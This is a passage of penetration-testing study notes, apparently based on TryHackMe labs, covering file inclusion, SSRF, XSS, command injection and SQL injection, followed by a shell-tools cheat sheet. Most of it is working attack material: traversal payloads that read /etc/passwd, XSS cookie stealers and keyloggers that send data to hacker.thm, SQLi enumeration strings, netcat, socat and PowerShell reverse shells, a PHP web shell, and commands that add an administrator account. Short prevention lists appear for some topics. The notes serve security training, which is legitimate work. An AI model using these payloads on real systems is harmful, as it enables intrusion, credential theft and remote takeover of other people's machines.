http://webapp.thm/get.php?file=/etc/passwd
```
+ Specified directory; no input validation. E.g.
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```
+ Use of Null Byte; file type specified in the include function; blackbox testing. E.g.
```
http://webapp.thm/index.php?lang=../../../../etc/passwd%00
```
Note: this is fixed with PHP 5.3.4 and above
+ Bypassing filters; filters specific characters; blackbox testing. E.g.
```
....//....//....//....//....//etc/passwd
```
+ Forces include to read from a defined directory. E.g.
```
?lang=languages/../../../../../etc/passwd
```

### Remote File Inclusion (RFI)
This technique includes remote files by injecting external URL. This occurs when the *allow_url_fopen* option is turned on in web applications. This often leads to RCE, sensitive information disclosure, XSS, and DoS attacks.

RFI steps include:
1. Host a PHP file on a server
2. Inject malicious URL (i.e. to the attacking server)
3. Web app includes the file and executes

### Prevention Methods
1. Keep system, services, frameworks updated
2. Turn of PHP errors to avoid revealing paths and other information
3. A Web Application Firewall (WAF) is useful
4. Disable PHP features that cause file inclusion vulnerabilities (e.g. allow_url_fopen, allow_url_include)
5. Allow only protocols and PHP wrappers when needed
6. Never trust user input; implement proper input validation
7. Implement whitelisting for file names and locations; the same for blacklisting

## SSRF
*Server-Side Request Forgery* is a vulnerability that causes the webserver to make an additional/edited HTTP request to a chosen resource. There are two types:
+ Regular SSRF - data is returned to attacker's screen
+ Blind SSRF - no information is returned to attacker's screen

SSRF attacks can result in:
+ Unauthorised access to restricted areas and data
+ Scale into internal networks
+ Reveal authentication tokens and credentials

### Finding SSRFs
These vulnerabilities can be identified in numerous ways:
+ A full URL is used in a paremeter in the address bar (e.g. https://website.thm/form?server=http://server.website.thm/store)
+ A hidden field in a form (e.g. value="http://server.website.thm/store")
+ A partial URL, such as the hostname (e.g. https://website.thm/form?server=api)
+ A path of the URL (e.g. https://website.thm/form?dst=/forms/contact)

Note: a lot of trial and error will be required

For blind SSRFs, an external HTTP logging tool would be required (e.g. request.bin, own HTTP server, Burp Suite's Collaborator).

### Beating Common SSRF Defenses
1. Deny List - alternative localhost references (e.g 0, 0.0.0.0, 0000, 127.1, 127\.*\.*\.*, 2130706433, 017700000001, subdomains that have DNS record which resolves to 127.0.0.1); for cloud environments, register a subdomain in their your own domain with a DNS record that points to 169.254.169.254
2. Allow List - create a subdomain on your own domain name (e.g. https://website.thm.attackers-domain.thm)
3. Open Redirect - utilise automatic redirection (e.g. https://website.thm/link?url=https://tryhackme.com) to redirect HTTP request to a chosen domain

## XSS
*Cross-Site Scripting (XSS)* is an attack where malicious JavaScript is injected into a web application, with the intention of being executed by other users. 

XSS payloads have two parts: intention (i.e. what the code will do) and modification (i.e. changes to the code per scenario).

Examples of XSS intentions include:
+ Proof of Concept - to demonstrate that XSS is achievable; E.g.
```
<script>alert('XSS');</script>
```
+ Session Stealing - targets login tokens/cookies; E.g.
```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
+ Key Logger - anything typed will be forwarded; E.g.
```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
+ Business Logic - more specific objectives; E.g.
```
<script>user.changeEmail('attacker@hacker.thm');</script>
```

### Types of XSS Vulnerabilities
#### Reflected XSS
This occurs when user-supplied data in HTTP requests is not validated. 

Example: website errors is taken from a parameter in the query string directly into the page source (e.g. https://website.thm/?error=Invalid Input Detected); attackers can insert malicious code

How to test:
+ Parameters in the URL query string
+ URL file path
+ HTTP headers; Note: not likely exploitable in practice

#### Stored XSS
Occurs when the XSS payload is stored on the web application (i.e. in a database) and is executed when other users visit the page.

Example: a blog website that allows user comments and does not filter malicious code; attackers can comment malicious code

How to test:
+ Comments on a blog
+ User profile information
+ Website listings
+ Manual HTTP request 

#### DOM-based XSS
Document Object Model (DOM) exploitation happens directly in the browser without loading new pages or data being submitted. These occur when a website JavaScript code acts on input or user interaction.

Example: a website gets content from window.location.hash parameter and writes onto the page currently viewed section, which does not filter the hashes; attackers can inject code 

How to test:
+ Look for accessible and controllable variables in the source code (e.g. window.location.x parameters), eval())

#### Blind XSS
Similar to stored XSS, the payloads get stored in a website but the attacker cannot see it working. 

Example: website's contact form allows messaging, which does not check for malicious code; attackers can enter malicious code for staff to view on their private portal.

How to test:
+ Add a call back (e.g. HTTP request) to the payload
+ Use tools such as [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express); alternaitively, make your own tool

## Command Injection / RCE
*Command injections* abuses an application to execute commands on the OS. These are often the most lucrative attacks as attackers can directly interact with the system.

This vulnerability is caused by an application's use of programming language functions that pass data and make system calls on a machine's OS. Applications that use user input to populate system commands can be combined with unintended behaviour (e.g. shell operators ;, &, && to combine more commands).

Command injections can be detected in two ways:
1. Blind command injection - no direct output from the application when testing payloads; observing an application's behaviour is needed to determine success
2. Verbose command injection - direct feedback from the application is provided when testing payloads

### Detecting Blind Command Injections
As the application outputs no message, two methods can be used:
+ Use payloads that cause some time delay (e.g. ping, sleep)
+ Force some output (e.g. > shell operator)
+ curl command to deliver data to and from an application (e.g. curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami)

### Detecting Verbose Command Injections
Output of commands will be directly displayed on the web application, making this easy.

### Useful payloads
For Linux:
+ whoami - see user
+ ls - lists contents of current directory
+ ping - invoke application to hang
+ sleep - useful where the machine does not have ping
+ nc - spawn a reverse shell

For Windows:
+ whoami - see user
+ dir - lists contents of current directory
+ ping - invoke application to hang
+ timeout - useful where the machine does not have ping

More commands can be found in this [repository](https://github.com/payloadbox/command-injection-payload-list).

### Remediating Command Injections
These attacks can be prevented in a variety of ways.

#### Vulnerable Functions
There are PHP functions that interact with the OS to execute commands via shell, including:
+ Exec
+ Passthru
+ System

Implement proper checks when using these functions to avoid command injections.

#### Input Sanitisation
Sanitising is a process of specifying formats or data types that a user can submit (e.g. only numerical data, remove > & and /). 

Note: it is still possible to abuse the logic behind these filter (e.g. using hexadecimal value of quotation marks)

## SQLi
*SQL injections (SQLi)* is an attack against an application's database server, which causes malicious queries to be executed. 

### In-Band SQLi
In-Band means that the same method of communication used to exploit the vulnerability also receives the result (e.g. discovering an injection and extracting data from the same page). These injections are easier to detect and exploit.

#### Error-Based SQLi
Useful for obtaining information about a database structure. Error messages are printed directly to the browser screen, which can be used to enumerate a whole database.

The key to discovering these is to break the SQL query by adding certain characters until an error message is produced (e.g. ' or ")

#### Union-Based SQLi
Utilises UNION with SELECT to return additional results. This can be used to extract large amounts of data.

### Blind SQLi
These injections do not show results of the attack on the screen (i.e. little to no feedback). 

#### Authentication Bypass
This entails just getting past the login page (i.e. not retrieving data from database). Login forms usually just check whether a username and password match, which then returns a true/false reply.

E.g. Forcing a query to return true using 1=1
```
select * from users where username='' and password='' OR 1=1;
```

#### Boolean-Based
These injections refer to boolean responses received from injection attempts. Outcomes confirm whether the SQLi is successful. 

Example process using:
```
select * from users where username = '%username%' LIMIT 1;
```
1. Add arbitrary parameter then attempt a force true
```
admin123' UNION SELECT 1;--
```
2. Try another value for columns
```
admin123' UNION SELECT 1,2,3;--
```
3. Trial and error to enumerate databases
```
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```
4. Trial and error to enumerate tables
```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```
5. Trial and error to enumerate columns
```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```
6. Trial and error to enumerate usernames
```
admin123' UNION SELECT 1,2,3 from users where username like 'a%
```
7. Trial and error to enumerate passwords
```
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

#### Time-Based
These are similar to boolean-based injections but only provides feedback based on the time the query takes to complete. This is done using the SLEEP method, which is only executed upon a successful query.

E.g. Database enumeration attempt; 5 second wait if successful
```
admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```

### Out-of-Band SQLi
These attacks are classified by having two different communication channels: first to launch the attack, second to gather results (e.g. attack using web request, data gathered by HTTP/DNS request monitoring).

### Remediation
There are ways to protect against SQLis:
+ Prepared Statements w/ Parameterised Queries - this is done by writing SQL queries then adding user inputs to parameters afterwards; ensures SQL code structure does not change
+ Input Validation - employing an allow list can restrict input to certain strings; string replacement methods can filter allowed/disallowed characters
+ Escaping User Input - method of prepending a backslash (i.e. \) to input, which causes them to be parsed as regular strings and not as special characters

## Privilege Escalation
## Tools
### Netcat
Starting a netcat listener for Linux
```
nc -lvnp <port-number>
```

Obtaining a bind shell on a target
```
nc <target-ip> <chosen-port>
```

There are three ways to stabilise netcat shells:
1. Python
```
# Spawn a bash shell
python -c 'import pty;pty.spawn("/bin/bash")'

# Get term commands
export TERM=xterm

# Background the shell
stty raw -echo; fg
```
2. rlwrap
```
# Install rlwrap
sudo apt install rlwrap

# Invoke listener
rlwrap nc -lvnp <port>
```
Note: this is particularly useful for Windows targets
3. Socat
```
# Establish a webserver from attacking machine
sudo python3 -m http.server 80

# Download socat static compiled binary
wget <LOCAL-IP>/socat -O /tmp/socat

# Check tty values
ssty -a

# Set row and column values
stty rows <number>
stty cols <number>
```
Note: this is only useful for Linux targets

### Socat
Execute a reverse shell
```
# Set up listener on attacking machine
socat TCP-L:<port> -

# Connect back to listener
# For Windows
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

# For Linux
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
Execute a bind shell
```
# Set up listener on target machine
# For Windows
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

# For Linux
socat TCP-L:<PORT> EXEC:"bash -li"

# Connect to target machine
socat TCP:<TARGET-IP>:<TARGET-PORT> -

```

To stabilise a socat shell
```
# Stablise special listener
socat TCP-L:<port> FILE:`tty`,raw,echo=0

# Activate listener
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
Note: this is useful for Linux  targets

### Encrypted Socat
For these shells, it is required to generate a certificate.
```
# Generate certificate on attacking machine
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.cr

# Merge two created files
cat shell.key shell.crt > shell.pem
```

These certificates can now be incorporated in OPENSSL commands.

For reverse shells
```
# Set up listener on attacking machine
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# Connect back to listener
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

For bind shells
```
# Set up listener on target machine
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

# Connect back to listener
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

### Common Payloads
Create a listener for a bind shell for Linux
```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
Send a netcat reverse shell for Linux
```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
One-liner reverse PSH shell for Windows
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Other common payloads can be found on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

### Metasploit msfvenom
*Msfvenom* is Metasploit's payload generator. This is widely used for reverse and bind shell code generation.

The syntax is as follows:
```
msfvenom -p <PAYLOAD> <OPTIONS>
```
E.g. msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

### Metasploit multi/handler
*multi/handler* is a tool for listening for reverse shells. These are essential when using staged payloads.

Using these involve two steps:
```
# Open Metasploit
msfconsole

# Invoke multi/handler
use multi/handler

# Set options
# 1. Payload
set PAYLOAD <payload>

# 2. LHOST
set LHOST <listen-address>

# 3. LPORT
set LPORT <listen-port>

# Start listener
exploit -j
```

### Web Shells
Web shells can be used for websites that do not allow upload of file executables. Commands can be entered through HTML or direct arguments in the URL, which are then executed by scripts. Note: these are useful when firewalls are used or to be used as stepping stones.

E.g. PHP web shell
```
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Note: Kali Linux provides a variety of web shells found in /usr/share/webshells

Note: for Windows, it is easiest to do a URL Encoded PowerShell reverse shell
```
# Copy into the URL as the cmd argument
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

### Next Steps
For Linux:
+ Look for opportunities to gain access to user accounts. E.g. SSH keys stored at /home/<user>/.ssh
+ Use exploits to add your own accounts or gain SSH access (e.g. [Dirty C0w](https://dirtycow.ninja/), writeable /etc/shadow or /etc/passwd)

For Windows:
+ Find passwords for running services in the registry (e.g. cleartext VNC passwords, FileZilla FTP credentials at C:\Program Files\FileZilla Server\FileZilla Server.xml or C:\xampp\FileZilla Server\FileZilla Server.xml)
+ Add your own account with administrator privileges; log in via:
```
net user <username> <password> /add

or

net localgroup administrators <username> /add
```

